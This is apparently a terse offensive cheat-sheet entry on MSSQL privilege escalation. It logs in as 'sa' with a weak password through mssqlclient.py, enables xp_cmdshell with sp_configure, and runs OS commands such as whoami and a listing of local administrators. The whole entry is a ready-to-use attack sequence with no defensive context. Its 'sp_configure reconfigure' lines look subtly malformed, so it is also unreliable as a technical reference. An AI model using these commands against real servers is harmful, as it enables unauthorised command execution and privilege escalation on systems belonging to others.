### SQL Services  privilege escalation
|for Example  |
| ------------- |
|python mssqlclient.py sa:123456@192.168.100.120|
|> EXEC sp_configure 'show advanced options', 1;|
|> EXEC sp_configure reconfigure;|
|> EXEC sp_configure 'xp_cmdshell', 1;|
|> EXEC sp_configure reconfigure;|
|> EXEC master.dbo.xp_cmdshell 'whoami';|
|> EXEC master.dbo.xp_cmdshell 'net localgroup administrators';|
